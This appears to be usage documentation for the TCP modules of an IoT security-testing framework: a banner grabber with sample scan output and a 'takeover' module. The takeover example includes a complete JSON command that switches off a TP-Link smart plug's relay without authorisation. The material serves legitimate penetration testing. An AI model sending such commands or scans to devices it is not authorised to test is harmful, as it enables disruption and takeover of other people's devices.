TCP
====

`Transmission Control Protocol (TCP) <https://en.wikipedia.org/wiki/Transmission_Control_Protocol>`_
is one of the main protocols of the Internet protocol suite that defines how
to establish and maintain a network conversation through which application
programs can exchange data. Many lightweight implementations of TCP are
implemented in IoT.

tcp.generic.banner
------------------

This test case allows to grab a given amount of line after a TCP
connection is established.

**Usage details:**

.. code-block:: console

   ef> run tcp.generic.banner -h

Examples
^^^^^^^^

.. code-block:: text

   ef> run tcp.generic.banner -r 192.168.1.4 -s 10 -e 25
   [...] 
   [*] Test in range 0-65535 on 192.168.1.4
   [+] results:
   [+]   22:
   [+]     SSH-2.0-OpenSSH_9.6
   [+] 
   [+] Test tcp.generic.banner passed


.. code-block:: text

   ef> run tcp.generic.banner -r expliot.io -v -s 400 -e 500 -t 0.2
   [...] 
   [*] Test in range 400-500 on expliot.io
   [-] Could not connect to expliot.io:400 - timed out
   [...]
   [-] Could not connect to expliot.io:442 - timed out
   [-] Socket error: timed out
   [-] Could not connect to expliot.io:444 - timed out
   [...]
   [+] results:
   [+]   443: No reponse
   [+] 
   [+] Test tcp.generic.banner passed


tcp.tpliot.takeover
-------------------

This test case allows to send unauthorized commands to TP-Link smart devices
on the same network.

**Usage details:**

.. code-block:: console

   ef> run tcp.tpliot.takeover -h

Examples
^^^^^^^^

.. note::

   Use ``crypto.tpliot.decrypt`` to decrypt and convert HEX to JSON for ``-d``.

.. code-block:: text

   ef> run tcp.tpliot.takeover -r 10.42.0.113 -p 9999 \
         -d {"context":{"source":"46a4d58b-6279-432c-ae23-e115c2db8354"},"system":{"set_relay_state":{"state":0}}}
  
   [...]
   [+] Received Response: 0000002dd0f281f88bff9af7d5ef94b6c5a0d48bf99cf091e8b7c4b0d1a5c0e2d8a381e496e4bbd8b7d3b694ae9ee39ee3
   [+] Decrypted Response: {"system":{"set_relay_state":{"err_code":0}}}
   [+] Test tcp.tpliot.takeover passed

